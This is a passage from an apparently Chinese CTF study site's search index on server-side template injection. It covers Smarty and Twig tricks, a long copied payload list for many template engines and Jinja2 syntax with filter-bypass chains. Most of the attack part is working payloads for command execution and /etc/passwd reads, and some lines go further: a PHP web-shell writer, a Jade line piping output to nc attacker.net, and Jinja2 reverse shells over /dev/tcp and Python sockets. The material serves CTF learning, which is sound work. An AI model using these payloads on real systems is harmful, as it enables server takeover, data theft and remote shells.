<p>\u901a\u8fc7self\u83b7\u53d6Smarty\u7c7b\u518d\u8c03\u7528\u5176\u9759\u6001\u65b9\u6cd5\u5b9e\u73b0\u6587\u4ef6\u8bfb\u5199\u88ab\u7f51\u4e0a\u5f88\u591a\u6587\u7ae0\u91c7\u7528\u3002</p> <p>Smarty\u7c7b\u7684getStreamVariable\u65b9\u6cd5\u7684\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>public function getStreamVariable($variable){        $_result = '';        $fp = fopen($variable, 'r+');        if ($fp) {            while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) {                $_result .= $current_line;            }            fclose($fp);            return $_result;        }        $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this;        if ($smarty-&gt;error_unassigned) {            throw new SmartyException('Undefined stream variable \"' . $variable . '\"');        } else {            return null;        }    }\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\u5e76\u8fd4\u56de\u5176\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7528self\u6765\u83b7\u53d6Smarty\u5bf9\u8c61\u5e76\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5f88\u591a\u6587\u7ae0\u91cc\u7ed9\u7684payload\u90fd\u5f62\u5982\uff1a{self::getStreamVariable(\u201cfile:///etc/passwd\u201d)}\u3002</p> <p>Smarty\u7684{if}\u6761\u4ef6\u5224\u65ad\u548cPHP\u7684if\u975e\u5e38\u76f8\u4f3c\uff0c\u53ea\u662f\u589e\u52a0\u4e86\u4e00\u4e9b\u7279\u6027\u3002\u6bcf\u4e2a{if}\u5fc5\u987b\u6709\u4e00\u4e2a\u914d\u5bf9\u7684{/if}\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528{else} \u548c {elseif}\uff0c\u5168\u90e8\u7684PHP\u6761\u4ef6\u8868\u8fbe\u5f0f\u548c\u51fd\u6570\u90fd\u53ef\u4ee5\u5728if\u5185\u4f7f\u7528\uff0c\u5982||, or, &amp;&amp;, and, is_array(), \u7b49\u7b49\uff0c\u5982\uff1a{if is_array($array)}{/if}\u90a3\u4e48\u540c\u6837\u7684\uff0c\u5728\u5229\u7528\u7684\u8fc7\u7a0b\u4e2d{ifsystem(\u2018cat \\flag\u2019)}{/if},\u4ea6\u6216\u8005\u662f{if readfile (\u2018/flag\u2019)}{/if}</p> <p>\u5927\u6982\u5c31\u8fd9\u4e48\u70b9\u4e86\uff0c\u5bf9\u4e86\u4f8b\u9898\uff1a\uff08\u81ea\u5df1\u53bb\u641c\u641c\uff09</p> <p>CISCN2019\u534e\u4e1c\u5357\u8d5b\u533aWeb11</p> <p>[BJDCTF2020]The mystery of ip</p>"},{"location":"web_bak/ssti/php/#twig","title":"twig","text":"<p>\u53e6\u5916\u4e00\u4e2aphp\u6a21\u677f\uff0c\u5176\u5b9e\u6709\u4e09\u4e2a\uff0c\u8fd9\u91cc\u53ea\u5199\u4e86\u4e24\u4e2a\uff0c\u5269\u4e0b\u7684\u90a3\u4e2a\u5b9e\u5728\u662f\u6ca1\u6709\u9047\u89c1\u8fc7</p> <p>\u8fd9\u4e2a\u4e5f\u633a\u5c11\u89c1\u7684\uff08\u5bf9\u6211\u6765\u8bf4</p> <p>\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e~\u53ea\u80fd~\u653e\u4e00\u4e9b\u66b4\u529b\u4e00\u70b9\u7684payload\u4e86</p> <pre><code>Twig - Basic injection\n{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{app.request.server.all|join(',')}}\nTwig - Template format\n$output = $twig &gt; render (\n'Dear' . $_GET['custom_greeting'],\narray(\"first_name\" =&gt; $user.first_name)\n);\n$output = $twig &gt; render (\n\"Dear {first_name}\",\narray(\"first_name\" =&gt; $user.first_name)\n);\nTwig - Arbitrary File Reading\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\nTwig - Code execution\n{{self}}\n{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{['cat\\x20/etc/passwd']|filter('system')}}\n{{['cat$IFS/etc/passwd']|filter('system')}}\nExample with an email passing FILTER_VALIDATE_EMAIL PHP.\nPOST /subscribe?0=cat+/etc/passwd HTTP/1.1\nemail=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld\n\u55ef\u662f\u7684\uff0c\u6ca1\u9519\uff0c\u5c31\u662f\u8fd9\u6837\uff08\u6307\u767d\u5ad6\u602a\uff09\n</code></pre> <p>\u6765\u81eagithub\u4e0a\u67d0\u4f4d\u8001\u54e5\u7684\u6770\u4f5c\u3002</p>"},{"location":"web_bak/ssti/%E6%9A%B4%E5%8A%9Bpayload/","title":"\u66b4\u529bpayload","text":"<p>\u6a21\u677f\u592a\u591a\uff0c\u5b66\u7684\u4e1c\u897f\u53c8\u592a\u5c11\uff1f</p> <p>\u8fd8\u5728\u62c5\u5fc3\u78b0\u5230\u65b0\u6a21\u677f\u4e0d\u4f1a\u505a\uff1f</p> <p>\u5bb3\u6015\u8fd9\u5f20\u56fe\uff1f</p> <p>\u66b4\u529b\u771f\u7684\u80fd\u591f\u89e3\u51b3\u5f88\u591a\u95ee\u9898\uff08\u6211\u7ed9\u4eba\u5bb6\u6574\u4e2a\u642c\u8fd0\u8fc7\u6765\u4e86\uff09</p> <pre><code>\u6765\u6e90\uff1ahttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twigRuby\nRuby - Basic injections\nERB:\n&lt;%= 7 * 7 %&gt;\nSlim:\n#{ 7 * 7 }\nRuby - Retrieve /etc/passwd\n&lt;%= File.open('/etc/passwd').read %&gt;\nRuby - List files and directories\n&lt;%= Dir.entries('/') %&gt;\nRuby - Code execution\nExecute code using SSTI for ERB engine.\n&lt;%= system('cat /etc/passwd') %&gt;\n&lt;%= `ls /` %&gt;\n&lt;%= IO.popen('ls /').readlines()  %&gt;\n&lt;% require 'open3' %&gt;&lt;% @a,@b,@c,@d=Open3.popen3('whoami') %&gt;&lt;%= @b.readline()%&gt;\n&lt;% require 'open4' %&gt;&lt;% @a,@b,@c,@d=Open4.popen4('whoami') %&gt;&lt;%= @c.readline()%&gt;\nExecute code using SSTI for Slim engine.\n#{ %x|env| }\nJava\nJava - Basic injection\n${7*7}\n${{7*7}}\n${class.getClassLoader()}\n${class.getResource(\"\").getPath()}\n${class.getResource(\"../../../../../index.htm\").getContent()}\nJava - Retrieve the system\u2019s environment variables\n${T(java.lang.System).getenv()}\nJava - Retrieve /etc/passwd\n${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}\nExpression Language EL\nExpression Language EL - Basic injection\n${1+1}\n#{1+1}\nExpression Language EL - Code Execution\n// Common RCE payloads\n''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(&lt;COMMAND STRING/ARRAY&gt;)\n''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(&lt;COMMAND ARRAY/LIST&gt;).start()\n// Method using Runtime\n#{session.setAttribute(\"rtc\",\"\".getClass().forName(\"java.lang.Runtime\").getDeclaredConstructors()[0])}\n#{session.getAttribute(\"rtc\").setAccessible(true)}\n#{session.getAttribute(\"rtc\").getRuntime().exec(\"/bin/bash -c whoami\")}\n// Method using processbuilder\n${request.setAttribute(\"c\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())}\n${request.getAttribute(\"c\").add(\"cmd.exe\")}\n${request.getAttribute(\"c\").add(\"/k\")}\n${request.getAttribute(\"c\").add(\"ping x.x.x.x\")}\n${request.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance(request.getAttribute(\"c\")).start())}\n${request.getAttribute(\"a\")}\n// Method using Reflection &amp; Invoke\n${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"calc.exe\")}\n// Method using ScriptEngineManager one-liner\n${request.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\\\\\"ping x.x.x.x\\\\\\\")\"))}\n// Method using ScriptEngineManager\n${facesContext.getExternalContext().setResponseHeader(\"output\",\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\\\"var x=new java.lang.ProcessBuilder;x.command(\\\\\\\"wget\\\\\\\",\\\\\\\"http://x.x.x.x/1.sh\\\\\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\"))}\nTwig\nTwig - Basic injection\n{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{app.request.server.all|join(',')}}\nTwig - Template format\n$output = $twig &gt; render (\n'Dear' . $_GET['custom_greeting'],\narray(\"first_name\" =&gt; $user.first_name)\n);\n$output = $twig &gt; render (\n\"Dear {first_name}\",\narray(\"first_name\" =&gt; $user.first_name)\n);\nTwig - Arbitrary File Reading\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\nTwig - Code execution\n{{self}}\n{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{['cat\\x20/etc/passwd']|filter('system')}}\n{{['cat$IFS/etc/passwd']|filter('system')}}\nExample with an email passing FILTER_VALIDATE_EMAIL PHP.\nPOST /subscribe?0=cat+/etc/passwd HTTP/1.1\nemail=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld\nSmarty\n{$smarty.version}\n{php}echo `id`;{/php}\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"&lt;?php passthru($_GET['cmd']); ?&gt;\",self::clearConfig())}\nFreemarker\nYou can try your payloads at https://try.freemarker.apache.org\nFreemarker - Basic injection\nThe template can be ${3*3} or the legacy #{3*3}\nFreemarker - Code execution\n&lt;#assign ex = \"freemarker.template.utility.Execute\"?new()&gt;${ ex(\"id\")}\n[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}\n${\"freemarker.template.utility.Execute\"?new()(\"id\")}\nFreemarker - Sandbox bypass\n\u26a0\ufe0f only works on Freemarker versions below 2.3.30\n&lt;#assign classloader=article.class.protectionDomain.classLoader&gt;\n&lt;#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")&gt;\n&lt;#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)&gt;\n&lt;#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")&gt;\n${dwf.newInstance(ec,null)(\"id\")}\nPebble\nPebble - Basic injection\n{{ someString.toUPPERCASE() }}\nPebble - Code execution\nOld version of Pebble ( &lt; version 3.0.9): {{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}.\nNew version of Pebble :\n{% set cmd = 'id' %}\n{% set bytes = (1).TYPE\n.forName('java.lang.Runtime')\n.methods[6]\n.invoke(null,null)\n.exec(cmd)\n.inputStream\n.readAllBytes() %}\n{{ (1).TYPE\n.forName('java.lang.String')\n.constructors[0]\n.newInstance(([bytes]).toArray()) }}\nJade / Codepen\n- var x = root.process\n- x = x.mainModule.require\n- x = x('child_process')\n= x.exec('id | nc attacker.net 80')\n#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}\nVelocity\n#set($str=$class.inspect(\"java.lang.String\").type)\n#set($chr=$class.inspect(\"java.lang.Character\").type)\n#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\"))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])\n$str.valueOf($chr.toChars($out.read()))\n#end\nMako\n&lt;%\nimport os\nx=os.popen('id').read()\n%&gt;\n${x}\nJinja2\nOfficial website\nJinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.\nJinja2 - Basic injection\n{{4*4}}[[5*5]]\n{{7*'7'}} would result in 7777777\n{{config.items()}}\nJinja2 is used by Python Web Frameworks such as Django or Flask. The above injections have been tested on Flask application.\nJinja2 - Template format\n{% extends \"layout.html\" %}\n{% block body %}\n&lt;ul&gt;\n{% for user in users %}\n&lt;li&gt;&lt;a href=\"{{ user.url }}\"&gt;{{ user.username }}&lt;/a&gt;&lt;/li&gt;\n{% endfor %}\n&lt;/ul&gt;\n{% endblock %}\nJinja2 - Debug Statement\nIf the Debug Extension is enabled, a {% debug %} tag will be available to dump the current context as well as the available filters and tests. This is useful to see what\u2019s available to use in the template without setting up a debugger.\n&lt;pre&gt;{% debug %}&lt;/pre&gt;\nSource: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement\nJinja2 - Dump all used classes\n{{ [].class.base.subclasses() }}\n{{''.class.mro()[1].subclasses()}}\n{{ ''.__class__.__mro__[2].__subclasses__() }}\nJinja2 - Dump all config variables\n{% for key, value in config.iteritems() %}\n&lt;dt&gt;{{ key|e }}&lt;/dt&gt;\n&lt;dd&gt;{{ value|e }}&lt;/dd&gt;\n{% endfor %}\nJinja2 - Read remote file\n# ''.__class__.__mro__[2].__subclasses__()[40] = File class\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\n{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }}\n# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398\n{{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }}\nJinja2 - Write into remote file\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}\nJinja2 - Remote Code Execution\nListen for connection\nnc -lnvp 8000\nExploit the SSTI by calling subprocess.Popen.\n\u26a0\ufe0f the number 396 will vary depending of the application.\n{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}\n{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\nExploit the SSTI by calling Popen without guessing the offset\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}\nSimply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113) In another GET parameter include a variable named \"input\" that contains the command you want to run (For example: &amp;input=ls)\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}\nExploit the SSTI by writing an evil config file.\n# evil config\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}\n# load the evil config\n{{ config.from_pyfile('/tmp/evilconfig.cfg') }}\n# connect to evil host\n{{ config['RUNCMD']('/bin/bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1\"',shell=True) }}\nJinja2 - Filter bypass\nrequest.__class__\nrequest[\"__class__\"]\nBypassing _\nhttp://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&amp;class=class&amp;usc=_\n{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}\n{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}\n{{request|attr([\"__\",\"class\",\"__\"]|join)}}\n{{request|attr(\"__class__\")}}\n{{request.__class__}}\nBypassing [ and ]\nhttp://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&amp;class=class&amp;usc=_\nor\nhttp://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_\nBypassing |join\nhttp://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_\nBypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:\n{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}\nJinjava\nJinjava - Basic injection\n{{'a'.toUpperCase()}} would result in 'A'\n{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206\nJinjava is an open source project developed by Hubspot, available at https://github.com/HubSpot/jinjava/\nJinjava - Command execution\nFixed by https://github.com/HubSpot/jinjava/pull/230\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}}\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}}\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\nHandlebars\nHandlebars - Command Execution\n{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{#with string.split as |codelist|}}\n{{this.pop}}\n{{this.push \"return require('child_process').execSync('ls -la');\"}}\n{{this.pop}}\n{{#each conslist}}\n{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}\nASP.NET Razor\nASP.NET Razor - Basic injection\n@(1+2)\nASP.NET Razor - Command execution\n@{\n// C# code\n}\n</code></pre>"},{"location":"web_bak/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","title":"SSTI","text":""},{"location":"web_bak/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_1","title":"\u5b9a\u4e49\u4ee5\u53ca\u7406\u89e3","text":"<p>\u6a21\u677f\u6ce8\u5165\u6d89\u53ca\u7684\u662f\u670d\u52a1\u7aefWeb\u5e94\u7528\u4f7f\u7528\u6a21\u677f\u5f15\u64ce\u6e32\u67d3\u7528\u6237\u8bf7\u6c42\u7684\u8fc7\u7a0b</p> <p>\u6a21\u7248\u5f15\u64ce\u4e00\u822c\u90fd\u9ed8\u8ba4\u5bf9\u6e32\u67d3\u7684\u53d8\u91cf\u503c\u8fdb\u884c\u7f16\u7801\u548c\u8f6c\u4e49\uff0c\u6240\u4ee5\u5e76\u4e0d\u4f1a\u9020\u6210\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002</p> <p>\u5982\u679c\u670d\u52a1\u7aef\u5c06\u7528\u6237\u7684\u8f93\u5165\u4f5c\u4e3a\u4e86\u6a21\u677f\u7684\u4e00\u90e8\u5206\uff0c\u90a3\u4e48\u5728\u9875\u9762\u6e32\u67d3\u65f6\u4e5f\u5fc5\u5b9a\u4f1a\u5c06\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9</p> <p>\u8fdb\u884c\u6a21\u7248\u7f16\u8bd1\u548c\u89e3\u6790\u6700\u540e\u8f93\u51fa\u3002</p> <p>\u6700\u5927\u7684\u4f18\u70b9\u5c31\u662f\u4f60\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u7aef\u52a8\u6001\u751f\u6210HTML\u9875\u9762\uff0c\u770b\u8d77\u6765\u8ddf\u9759\u6001HTML\u9875\u9762\u4e00\u6837\u3002</p> <p>\u9996\u5148\u6211\u4eec\u5148\u8bb2\u89e3\u4e0b\u4ec0\u4e48\u662f\u6a21\u677f\u5f15\u64ce\uff0c\u4e3a\u4ec0\u4e48\u9700\u8981\u6a21\u677f\uff0c\u6a21\u677f\u5f15\u64ce\u53ef\u4ee5\u8ba9\uff08\u7f51\u7ad9\uff09\u7a0b\u5e8f\u5b9e\u73b0\u754c\u9762\u4e0e\u6570\u636e\u5206\u79bb\uff0c\u4e1a\u52a1\u4ee3\u7801\u4e0e\u903b\u8f91\u4ee3\u7801\u7684\u5206\u79bb\uff0c\u8fd9\u5927\u5927\u63d0\u5347\u4e86\u5f00\u53d1\u6548\u7387\uff0c\u826f\u597d\u7684\u8bbe\u8ba1\u4e5f\u4f7f\u5f97\u4ee3\u7801\u91cd\u7528\u53d8\u5f97\u66f4\u52a0\u5bb9\u6613\u3002\u4f46\u662f\u5f80\u5f80\u65b0\u7684\u5f00\u53d1\u90fd\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u5b89\u5168\u95ee\u9898\uff0c\u867d\u7136\u6a21\u677f\u5f15\u64ce\u4f1a\u63d0\u4f9b\u6c99\u7bb1\u673a\u5236\uff0c\u4f46\u540c\u6837\u5b58\u5728\u6c99\u7bb1\u9003\u9038\u6280\u672f\u6765\u7ed5\u8fc7\u3002</p> <p>\uff08\u5feb\u6377\u65b9\u4fbf------&gt;\u627f\u62c5\u98ce\u9669\uff09</p> <p>\u6240\u4ee5\u6f0f\u6d1e\u7684\u6765\u6e90\u8fd8\u662f\u90a3\u4e00\u4e2a\uff1a\u8fc7\u4e8e\u4fe1\u4efb\u7528\u6237\u6240\u8f93\u5165\u7684\u6570\u636e\u3002</p> <p></p> <p>\u796d\u51fa\u8fd9\u5f20\u7ecf\u5178\u7684\u56fe\uff0c\u7ecf\u5e38\u7528\u6765\u5224\u65ad\u6a21\u677f\u7c7b\u578b</p> <p>\u9700\u8981\u5173\u6ce8\u7684\u70b9\uff1a{{7*\u20187\u2019}}</p> <p>Jinja2\u8f93\u51fa\u4e3a49</p> <p>TWIG\u8f93\u51fa\u4e3a7777777</p> <p>\u90a3\u4e48\u5230\u5e95\u8fd9\u4e2a\u4e1c\u897f\u80fd\u5e72\u561b\u5462\uff1f</p> <p>\u5148\u7ed9\u51fa\u521d\u6b65\u5370\u8c61\uff08jinja2\uff09\uff1a</p> <p>\u7528\u6237\u8f93\u5165{{7+7}}</p> <p>\u7136\u540e\u670d\u52a1\u5668\u5e2e\u4f60\u8fd0\u884c{{}}\u4e2d\u7684\u4ee3\u7801\uff0c\u7b97\u51fa\u6765=49.</p> <p>\u5c31\u662f\u76f8\u5f53\u4e8e\u670d\u52a1\u5668\u5e2e\u4f60\u89e3\u6790\u8fd0\u884c\u4e86\u4f60\u8f93\u5165\u7684\u6570\u636e\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5982\u679c\u8f93\u5165\u7684\u662f\u6076\u610f\u7684\u4ee3\u7801........</p>"},{"location":"web_bak/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_2","title":"\u57fa\u7840\u8bed\u6cd5","text":"<p>\u89c9\u5f97\u5199\u7684\u592a\u5c11\u4e86\u60f3\u6dfb\u52a0\u6b22\u8fce\u3002</p> <pre><code>{% ... %} for Statements\n{{ ... }} for Expressions to print to the template output\n{# ... #} for Comments not included in the template output\n#  ... # for Line Statements\n</code></pre> <p>\u8fd9\u4e2a\u662f\u5b98\u65b9\u6587\u6863\u7684\u4ecb\u7ecd</p> <p>{%%}\u53ef\u4ee5\u7528\u6765\u58f0\u660e\u53d8\u91cf\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5faa\u73af\u8bed\u53e5\u548c\u6761\u4ef6\u8bed\u53e5\u3002</p> <p>{{}}\u7528\u4e8e\u5c06\u8868\u8fbe\u5f0f\u6253\u5370\u5230\u6a21\u677f\u8f93\u51fa</p> <p>{##}\u8868\u793a\u672a\u5305\u542b\u5728\u6a21\u677f\u8f93\u51fa\u4e2d\u7684\u6ce8\u91ca</p>"},{"location":"web_bak/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_3","title":"\u53ef\u4ee5\u6709\u548c{%%}\u76f8\u540c\u7684\u6548\u679c","text":"<pre><code>{% set x= 'abcd' %}  \u58f0\u660e\u53d8\u91cf\n{% for i in ['a','b','c'] %}{{i}}{%endfor%} \u5faa\u73af\u8bed\u53e5\n{% if 25==5*5 %}{{1}}{% endif %}  \u6761\u4ef6\u8bed\u53e5\n</code></pre> <pre><code># for i in ['a','1']{{ i }}# endfor\n{% for i in ['a','1'] %}{{ item }}{% endfor %}\n\u8fd9\u4e24\u6761\u662f\u7b49\u6548\u7684\uff0c\u4f46\u662f\u6709\u4e2a\u524d\u63d0\uff0c\u5fc5\u987b\u5728environment\u4e2d\u914d\u7f6eline_statement_prefix\u5373app.jinja_env.line_statement_prefix=\"#\"\n</code></pre> <p>You can use a dot (.) to access attributes of a variable in addition to the standard Python getitem \u201csubscript\u201d syntax ([]). --\u5b98\u65b9\u539f\u6587</p> <p>\u9664\u4e86\u6807\u51c6\u7684python\u8bed\u6cd5\u4f7f\u7528\u70b9<code>\uff08.\uff09</code>\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e2d\u62ec\u53f7<code>\uff08[]\uff09</code>\u6765\u8bbf\u95ee\u53d8\u91cf\u7684\u5c5e\u6027\u3002</p> <pre><code>{{\"\".__class__}}\n{{\"\"['__classs__']}}\n</code></pre> <p>\u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u8fd9\u4e5f\u662f\u4e00\u79cd\u7ed5\u8fc7\u3002</p> <p>\u6709\u4e9b\u9898\u76ee\u4f1a\u5199\u7684\u5f88\u957f\uff0c\u4e0d\u59a8\u62ff\u4e2a\u8fc7\u6765\u770b\u770b\uff0c\u5982\u679c\u80fd\u770b\u61c2\u90a3\u57fa\u7840\uff08\u751a\u81f3\u662f\u8fdb\u9636\uff09\u90e8\u5206\u5e94\u8be5\u5c31\u6ca1\u4ec0\u4e48\u95ee\u9898\u4e86\u3002</p> <pre><code>{% set id=dict(ind=a,ex=a)|join%}#\u5229\u7528join\u8fc7\u6ee4\u5668\u62fc\u63a5\u6210index\uff0c\u4e0b\u9762\u51e0\u4e2a\u7c7b\u4f3c\n{% set pp=dict(po=a,p=a)|join%}\n{% set ls=dict(ls=a)|join%}\n{% set ppe=dict(po=a,pen=a)|join%}\n{% set gt=dict(ge=a,t=a)|join%}\n{% set cr=dict(ch=a,r=a)|join%}\n{% set nn=dict(n=a)|join%}\n{% set tt=dict(t=a)|join%}\n{% set ff=dict(f=a)|join%}\n{% set ooqq=dict(o=a,s=a)|join %}\n{% set rd=dict(re=a,ad=a)|join%}\n{% set five=(lipsum|string|list)|attr(id)(tt) %}#\u8fd9\u91cc\u7528lipsum\u8fc7\u6ee4\u5668\u6700\u7ec8\u80fd\u591f\u53d6\u5f97\u6570\u5b575{\u5177\u4f53\u6d41\u7a0b\uff1a\u751f\u6210\u968f\u673a\u6570\u5b57-&gt;\u5b57\u7b26\u4e32\u5217\u8868\u8f93\u51fa-&gt;index(\"f\")\u627e\u5b57\u7b26'f'\u5728\u751f\u6210\u7684\u5217\u8868\u4e2d\u7684\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e..}\uff08lorem\u00a0is not just a normal snippet\u2014it\u2019s actually a\u00a0generator. Every time you expand it, it will generate a 30-words dummy text, splitted into a few sentences.\uff09\n{% set three=(lipsum|string|list)|attr(id)(nn) %}\n{% set one=(lipsum|string|list)|attr(id)(ff) %}\n{% set shiba=five*five-three-three-one %}\n{% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) 